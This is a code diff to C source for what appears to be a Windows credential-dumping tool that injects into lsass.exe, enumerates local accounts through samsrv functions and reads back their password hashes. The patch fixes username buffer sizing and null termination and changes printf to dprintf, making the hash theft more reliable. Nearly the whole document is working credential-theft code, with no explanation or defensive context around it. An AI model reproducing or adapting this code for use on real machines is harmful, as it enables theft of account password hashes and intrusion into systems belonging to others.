@@ -236,6 +236,7 @@ int dumpSAM(FUNCTIONARGS *fargs) {
 	HANDLE hReadLock = NULL, hFreeLock = NULL;
 	DWORD dwUsernameLength = 0, dwCurrentUser = 0, dwStorageIndex = 0;
 	DWORD dwError = 0;
+	DWORD i;
 
 	/* load samsrv functions */
 	hSamSrv = fargs->LoadLibrary(fargs->samsrvdll);
@@ -319,9 +320,12 @@ int dumpSAM(FUNCTIONARGS *fargs) {
 			if (pSamrQueryInformationUser(hUser, SAM_USER_INFO_PASSWORD_OWFS, &pvUserInfo) < 0) { dwError = 1; goto cleanup; }
 
 			/* allocate space for another username */
-			dwUsernameLength = (pEnumeratedUsers->pSamDomainUser[dwCurrentUser].wszUsername.Length / 2) + 1;
-			(fargs->pUsernameHashData)[dwStorageIndex].Username = (char *)pMalloc(dwUsernameLength);
+			dwUsernameLength = (pEnumeratedUsers->pSamDomainUser[dwCurrentUser].wszUsername.Length / 2);
+			(fargs->pUsernameHashData)[dwStorageIndex].Username = (char *)pMalloc(dwUsernameLength + 1);
 			if ((fargs->pUsernameHashData)[dwStorageIndex].Username == NULL) { dwError = 1; goto cleanup; } 
+			for ( i=0; i < (dwUsernameLength + 1); i++ ) {
+				(fargs->pUsernameHashData)[dwStorageIndex].Username[i] = 0;
+			}
 			
 			/* copy over the new name, length, rid and password hash */
 			pWcstombs((fargs->pUsernameHashData)[dwStorageIndex].Username, pEnumeratedUsers->pSamDomainUser[dwCurrentUser].wszUsername.Buffer, dwUsernameLength);
@@ -493,14 +497,14 @@ int __declspec(dllexport) control(DWORD dwMillisecondsToWait, char **hashresults
 		/* calculate the function size */
 		FunctionSize = (DWORD)sizer - (DWORD)dumpSAM;
 		if (FunctionSize <= 0) {
-			printf("Error calculating the function size.\n");
+			dprintf("Error calculating the function size.\n");
 			dwError = 1;
 			break;
 		}
 
 		/* set access priv */
 		if (SetAccessPriv() == 0) {
-			printf("Error setting SE_DEBUG_NAME privilege\n");
+			dprintf("Error setting SE_DEBUG_NAME privilege\n");
 			dwError = 1;
 			break;
 		}
@@ -508,7 +512,7 @@ int __declspec(dllexport) control(DWORD dwMillisecondsToWait, char **hashresults
 		/* get the lsass handle */
 		hLsassHandle = GetLsassHandle();
 		if (hLsassHandle == 0) {
-			printf("Error getting lsass.exe handle.\n");
+			dprintf("Error getting lsass.exe handle.\n");
 			dwError = 1;
 			break;
 		}
@@ -539,7 +543,7 @@ int __declspec(dllexport) control(DWORD dwMillisecondsToWait, char **hashresults
 		
 		/* wait until the data is ready to be collected */
 		if (WaitForSingleObject(hReadLock, dwMillisecondsToWait) != WAIT_OBJECT_0) {
-			printf("Timed out waiting for the data to be collected.\n");
+			dprintf("Timed out waiting for the data to be collected.\n");
 			dwError = 1;
 			break;
 		}
@@ -565,17 +569,18 @@ int __declspec(dllexport) control(DWORD dwMillisecondsToWait, char **hashresults
 		for (dwCurrentUserIndex = 0; dwCurrentUserIndex < dwNumberOfUsers; dwCurrentUserIndex++) {
 			UsernameAddress = UsernameHashResults[dwCurrentUserIndex].Username;
 			
-			UsernameHashResults[dwCurrentUserIndex].Username = (char *)malloc(UsernameHashResults[dwCurrentUserIndex].Length);
+			UsernameHashResults[dwCurrentUserIndex].Username = (char *)malloc(UsernameHashResults[dwCurrentUserIndex].Length + 1);
 			if (UsernameHashResults[dwCurrentUserIndex].Username == NULL) { dwError = 1; break; }
 
 			if (ReadProcessMemory(hLsassHandle, UsernameAddress, UsernameHashResults[dwCurrentUserIndex].Username, UsernameHashResults[dwCurrentUserIndex].Length, &sBytesRead) == 0) { dwError = 1; break; }
 			if (sBytesRead != UsernameHashResults[dwCurrentUserIndex].Length) { dwError = 1; break; }
+			UsernameHashResults[dwCurrentUserIndex].Username[  UsernameHashResults[dwCurrentUserIndex].Length ] = 0;
 		}
 
 		/* signal that all data has been read and wait for the remote memory to be free'd */
 		if (SetEvent(hFreeLock) == 0) { dwError = 1; break; }
 		if (WaitForSingleObject(hReadLock, dwMillisecondsToWait) != WAIT_OBJECT_0) {
-			printf("The timeout pooped.\n");
+			dprintf("The timeout hit.\n");
 			dwError = 1;
 			break;
 		}
